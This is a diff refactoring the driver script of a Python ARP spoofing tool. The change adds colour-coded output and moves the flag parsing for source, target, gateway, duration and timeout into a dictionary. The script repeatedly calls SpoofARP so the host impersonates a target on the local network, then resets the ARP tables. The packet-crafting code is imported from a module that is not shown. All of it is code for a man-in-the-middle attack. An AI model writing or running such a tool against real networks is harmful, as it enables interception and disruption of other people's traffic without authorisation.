@@ -1,58 +1,78 @@
-import sys
+import sys, colorama
 from spoof import *
 
 def CheckFlags(required, arguments):
 	for flag in required:
-		if flag not in arguments: ThrowError("Required flag criteria not met.")
+		if flag not in arguments: PrintMessage("Required flag criteria not met.", -1)
 
-def ThrowError(message):
-	print(f"[*] {message}")
-	sys.exit()
+def PrintMessage(message, code):
+	colour = None
+	white = colorama.Fore.WHITE
 
-try:
-	CheckFlags(REQUIRED_FLAGS, sys.argv)
-	
-	attack_length   = DEFAULT_LENGTH
-	request_timeout = DEFAULT_TIMEOUT
+	match code:
+		case 0:
+			colour = colorama.Fore.GREEN
+			print(f"[{colour}*{white}] {message}")
+		case 1:
+			colour = colorama.Fore.BLUE
+			print(f"[{colour}*{white}] {message}")
+		case -1:
+			colour = colorama.Fore.RED
+			print(f"[{colour}*{white}] {message}")
+			sys.exit()
 
-	source_mac  = None
-	target_mac  = None
-	gateway_mac = None
-
-	source_address  = None
-	target_address  = None
-	gateway_address = None
-
+def CheckArguments(parameters):
 	for argument in range(0, len(sys.argv)):
 		match sys.argv[argument]:
 			case '-s':
-				source_address = sys.argv[argument + 1]
+				parameters["Source"] = sys.argv[argument + 1]
 			case '-t':
-				target_address = sys.argv[argument + 1]
+				parameters["Target"] = sys.argv[argument + 1]
 			case '-g':
-				gateway_address = sys.argv[argument + 1]
+				parameters["Gateway"] = sys.argv[argument + 1]
 			case '-l':
-				attack_length = int(sys.argv[argument + 1])
+				parameters["Length"] = int(sys.argv[argument + 1])
 			case '-d':
-				request_timeout = int(sys.argv[argument + 1])
+				parameters["Timeout"] = int(sys.argv[argument + 1])
+	return parameters
 
-	source_mac  = GetMAC(source_address, request_timeout)
-	target_mac  = GetMAC(target_address, request_timeout)
-	gateway_mac = GetMAC(gateway_address, request_timeout)
+source_mac  = None
+target_mac  = None
+gateway_mac = None
 
-	print(f"[*] Temporarily disguising as {target_address} for {attack_length} second(s) and an abandon packet interval of {request_timeout} second(s)")
+try:
+	CheckFlags(REQUIRED_FLAGS, sys.argv)
+
+	functional_parameters = {
+		"Source":  None,
+		"Target":  None,
+		"Gateway": None,
+		"Length":  None,
+		"Timeout": None
+	}
+
+	functional_parameters["Length"]  = DEFAULT_LENGTH
+	functional_parameters["Timeout"] = DEFAULT_TIMEOUT
+
+	functional_parameters = CheckArguments(functional_parameters)
+
+	source_mac  = GetMAC(functional_parameters["Source"], functional_parameters["Timeout"])
+	target_mac  = GetMAC(functional_parameters["Target"], functional_parameters["Timeout"])
+	gateway_mac = GetMAC(functional_parameters["Gateway"], functional_parameters["Timeout"])
+
+	PrintMessage(f"[*] Temporarily disguising as {functional_parameters["Target"]} for {functional_parameters["Length"]} second(s) and an abandon packet interval of {functional_parameters["Timeout"]} second(s)", 0)
 
 	counter = 0
-	while counter < attack_length:
-		print(SpoofARP(target_address, gateway_address, source_mac, target_mac, gateway_mac))
+	while counter < functional_parameters["Length"]:
+		PrintMessage(SpoofARP(functional_parameters["Target"], functional_parameters["Gateway"], source_mac, target_mac, gateway_mac), 1)
 		counter += 1
 		time.sleep(1)
 
-	ResetARP(target_address, gateway_address, target_mac, gateway_mac)
+	ResetARP(functional_parameters["Target"], functional_parameters["Gateway"], target_mac, gateway_mac)
 except IndexError:
-	ThrowError("Source, target and router not specified.")
+	PrintMessage("Source, target and router not specified.", -1)
 except KeyboardInterrupt:
-	ResetARP(target_address, gateway_address, target_mac, gateway_mac)
-	ThrowError("Interrupted. Reverting all ARP changes.")
+	ResetARP(functional_parameters["Target"], functional_parameters["Gateway"], target_mac, gateway_mac)
+	PrintMessage("Interrupted. Reverting all ARP changes.", -1)
 except ValueError:
-	ThrowError("There was an error. Please check the flag values you provided.")
+	PrintMessage("There was an error. Please check the flag values you provided.", -1)
